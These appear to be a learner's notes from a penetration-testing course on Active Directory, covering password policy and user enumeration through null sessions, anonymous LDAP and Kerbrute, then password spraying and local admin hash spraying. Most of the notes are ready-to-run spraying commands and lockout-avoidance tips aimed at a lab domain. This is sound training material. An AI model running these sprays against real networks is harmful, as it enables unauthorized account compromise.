    As stated in the previous section, we can pull the domain password policy in several ways, depending on how the domain is configured and whether or not we have valid domain credentials. With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec or rpcclient.


    \\\Enumerating the Password Policy - from Linux - CrackMapExec

    $ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol



    \\\\Enumerating the Password Policy - from Linux - SMB NULL Sessions


    Without credentials, we may be able to obtain the password policy via an SMB NULL session or LDAP anonymous bind. The first is via an SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.

    When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration. An SMB NULL session can be enumerated easily. For enumeration, we can use tools such as enum4linux, CrackMapExec, rpcclient, etc.


    $ rpcclient -U "" -N 172.16.5.5

    rpcclient $> querydominfo

    rpcclient $> getdompwinfo



    Here are some common enumeration tools and the ports they use:
    Tool 	          Ports
nmblookup 	        137/UDP
nbtstat 	        137/UDP
net 	            139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535
rpcclient 	        135/TCP
smbclient 	        445/TCP


\\Using enum4linux-ng

    $ enum4linux-ng -P 172.16.5.5 -oA ilfreight

    Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.


\\\\Enumerating Null Session - from Windows


we could use the command > net use \\host\ipc$ "" /u:"" to establish a null session from a windows machine 

C:\htb> net use \\DC01\ipc$ "" /u:""


---Error: Account is Disabled

C:\htb> net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.

This user can't sign in because this account is currently disabled.


---Error: Password is Incorrect

C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.

The user name or password is incorrect.


---Error: Account is locked out (Password Policy)

C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.

The referenced account is currently locked out and may not be logged on to.




    \\\\\Enumerating the Password Policy - from Linux - LDAP Anonymous Bind


LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as windapsearch.py, ldapsearch, ad-ldapdomaindump.py, etc., to pull the password policy. With ldapsearch, it can be a bit cumbersome but doable. One example command to get the password policy is as follows:

$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength



    \\\\Enumerating the Password Policy - from Windows

If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as net.exe to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.



\\Using net.exe

    C:\htb> net accounts

\\Using PowerView

    PS C:\htb> import-module .\PowerView.ps1
    PS C:\htb> Get-DomainPolicy



        
        \\\Detailed User Enumeration


    To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:

    By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
    
    Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
    
    Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users
    
    Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist


     Regardless of the method we choose, and if we have the password policy or not, we must always keep a log of our activities, including, but not limited to:

    The accounts targeted
    Domain Controller used in the attack
    Time of the spray
    Date of the spray
    Password(s) attempted




        \\\\SMB NULL Session to Pull User List

    If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. 

    Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others.

    We can do this with enum4linux with the -U flag.

    $ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

    We can use the enumdomusers command after connecting anonymously using rpcclient.

    $ rpcclient -U "" -N 172.16.5.5

    rpcclient $> enumdomusers 

    Finally, we can use CrackMapExec with the --users flag

    !This is a useful tool that will also show the badpwdcount (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the baddpwdtime, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset. In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.

    $ crackmapexec smb 172.16.5.5 --users



        \\\\Gathering Users with LDAP Anonymous


    We can use various tools to gather users when we find an LDAP anonymous bind. Some examples include windapsearch and ldapsearch. If we choose to use ldapsearch we will need to specify a valid LDAP search filter. We can learn more about these search filters in the Active Directory LDAP module.

    https://academy.hackthebox.com/course/preview/active-directory-ldap

    $ ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "


    Tools such as windapsearch make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the -u flag and the -U flag to tell the tool to retrieve just users.

    $ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U



            \\\Enumerating Users with Kerbrute

    
    As mentioned in the Initial Enumeration of The Domain section, if we have no access at all from our position in the internal network, we can use Kerbrute to enumerate valid AD accounts and for password spraying.

    This tool uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error PRINCIPAL UNKNOWN, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts. However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.

    $  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 



            \\\Credentialed Enumeration to Build our User List


    $ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users



            \\\\Internal Password Spraying - from Linux

    
    Rpcclient is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. The following Bash one-liner  can be used to perform the attack.

    $ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

    We can also use Kerbrute for the same attack as discussed previously.

    $ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    Another great option is using CrackMapExec. The ever-versatile tool accepts a text file of usernames to be run against a single password in a spraying attack. Here we grep for + to filter out logon failures and hone in on only valid login attempts to ensure we don't miss anything by scrolling through many lines of output.

    $ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

    -Validating the Credentials with CrackMapExec

    $ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123



        \\\Local Administrator Password Reuse

    -Local Admin Spraying with CrackMapExec

    $ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
    





        \\\\Internal Password Spraying - from Windows

    
    From a foothold on a domain-joined Windows host, the DomainPasswordSpray tool is highly effective. (Powershell)
    There are several options available to us with the tool. Since the host is domain-joined, we will skip the -UserList flag and let the tool generate a list for us. We'll supply the Password flag and one single password and then use the -OutFile flag to write our output to a file for later use.


        -Using DomainPasswordSpray.ps1

    PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
    PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

    We could also utilize Kerbrute to perform the same user enumeration and spraying steps shown in the previous section. The tool is present in the C:\Tools directory if you wish to work through the same examples from the provided Windows host.

    